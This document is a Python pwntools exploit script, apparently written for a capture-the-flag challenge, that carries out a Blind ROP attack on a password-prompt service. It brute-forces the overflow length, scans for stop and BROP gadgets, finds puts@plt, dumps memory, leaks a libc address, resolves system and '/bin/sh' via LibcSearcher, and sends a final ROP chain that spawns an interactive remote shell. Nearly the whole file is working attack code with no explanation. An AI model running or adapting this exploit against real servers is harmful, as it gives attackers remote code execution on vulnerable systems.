from pwn import *
from LibcSearcher import *

IP = "localhost"
PORT = 10001

# 1. Check Overflow Size
def check_overflow():
	i = 1
	while True:
		r = remote(IP, PORT, level='error')
		r.recvuntil('password?\n')
		r.sendline("A"*i)
		resp = r.recvall()
		r.close()

		if "No password, no game" in resp:
			i += 1
		else:
			print "Overflow Size: ", (i-1)
			return i-1

# 2. Find STOP Gadget
def find_stop_gadget(size, base):
	for offset in range(0x1000):
		if offset % 0x100 == 0:
			print "Progressed ... (finding STOP Gadget) -- offset: ", hex(offset)
		addr = base + offset
		r = remote(IP, PORT, level='error')
		r.recvuntil('password?\n')
		r.sendline("A"*size + p64(addr))
		try:
			resp = r.recv(timeout=0.2)
			r.close()
			if "password?" in resp:
				print "Found STOP Gadget: ", hex(addr)
				return addr
		except:
			pass

# 3. Find BROP Gadget
def find_brop_gadget(size, base, stop_gadget):
	for offset in range(0x1000):
		if offset % 0x100 == 0:
			print "Progressed ... (finding BROP Gadget) -- offset: ", hex(offset)
		addr = base + offset
		r = remote(IP, PORT, level='error')
		r.recvuntil('password?\n')
		r.sendline("A"*size + p64(addr) + p64(0)*6 + p64(stop_gadget))
		try:
			resp = r.recv(timeout=0.5)
			r.close()
			if "password?" in resp:
				r = remote(IP, PORT, level='error')
				r.recvuntil('password?\n')
				r.sendline("A"*size + p64(addr) + p64(0x41)*10)
				try:
					resp = r.recv()
					r.close()
				except Exception as e:
					r.close()
					print "Found BROP Gadget: ", hex(addr)
					print "pop rdi ; ret : ", hex(addr+0x9)
					return addr + 0x9 # pop rdi ; ret
		except Exception as e:
			r.close()

# 4. Find Address(@plt) of Printable Function
def find_puts_addr(size, base, stop_gadget, pop_rdi_ret):
	for offset in range(0x1000):
		if offset % 0x100 == 0:
			print "Progressed ... (finding puts@plt) -- offset: ", hex(offset)
		addr = base + offset
		r = remote(IP, PORT, level='error')
		r.recvuntil('password?\n')
		r.sendline("A"*size + p64(pop_rdi_ret) + p64(base) + p64(addr))
		try:
			resp = r.recv()
			r.close()
			if resp.startswith("\x7fELF"):
				print "Found puts@plt : ", hex(addr)
				return addr # puts@plt
		except Exception as e:
			r.close()

# 5. Dump Memory
def dump(size, base, stop_gadget, pop_rdi_ret, puts_plt):
	now = base
	end = base + 0x1000
	dump = ''
	while now < end:
		payload = "A"*size
		payload += p64(pop_rdi_ret)
		payload += p64(now)
		payload += p64(puts_plt)
		payload += p64(stop_gadget)

		r = remote(IP, PORT, level='error')
		r.recvuntil('WelCome my friend,Do you know password?\n')
		r.sendline(payload)
		try:
			resp = r.recv(timeout=0.5)
			r.close()
			resp = resp[:resp.index('\nWelCome')]
		except ValueError as e:
			resp = resp
		except Exception as e:
			continue
		
		if len(resp.split()) == 0:
			resp = "\x00"

		dump += resp
		now += len(resp)

	with open('memory.dump', 'wb') as f:
		f.write(dump)
		print "Dump memory"
		'''
		Find puts@got.plt
		$ r2 -B 0x400000 memory.dump
		>> pd 10 @ <puts@plt>
		'''

# 6. Leak Memory (Libc)
def leak_libc(r, size, stop_gadget, pop_rdi_ret, puts_plt, puts_got):
	r.recvuntil('password?\n')
	r.sendline("A"*size + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget))
	libc = u64(r.recvuntil('\n')[:-1].ljust(8, "\x00"))
	print "Libc : ", hex(libc)
	return libc

# 7. Search libc
def search_libc(size, leak_addr):
	lib = LibcSearcher('puts', leak_addr)
	libc_base = leak_addr - lib.dump('puts')
	system_addr = libc_base + lib.dump('system')
	binsh_addr = libc_base + lib.dump('str_bin_sh')

	print 'Libc Base: ', hex(libc_base)
	print 'system() : ', hex(system_addr)
	print '/bin/sh  : ', hex(binsh_addr)
	return system_addr, binsh_addr

# 8. Attack
def exploit(size, stop_gadget, pop_rdi_ret, puts_plt, puts_got):
	r = remote(IP, PORT, level='error')
	libc_addr = leak_libc(r, size, stop_gadget, pop_rdi_ret, puts_plt, puts_got)
	system_addr, binsh_addr = search_libc(gap, libc_addr)
	'''
	libc_addr -= 0x6f690
	_system = libc_addr + 0x45390
	_binsh = libc_addr + 0x18cd57
	'''

	payload = "A"*size
	payload += p64(pop_rdi_ret)
	payload += p64(binsh_addr)
	payload += p64(system_addr)
	payload += p64(stop_gadget)

	r.recvuntil('password?\n')
	r.sendline(payload)
	r.interactive()

if __name__ == "__main__":
	seg_base = 0x400000
	gap = check_overflow()
	stop = find_stop_gadget(gap, seg_base)
	rdi_gadget = find_brop_gadget(gap, seg_base, stop)
	puts_addr = find_puts_addr(gap, seg_base, stop, rdi_gadget)
	# dump(gap, seg_base, stop, rdi_gadget, puts_addr)
	puts_got = 0x601018
	exploit(gap, stop, rdi_gadget, puts_addr, puts_got)

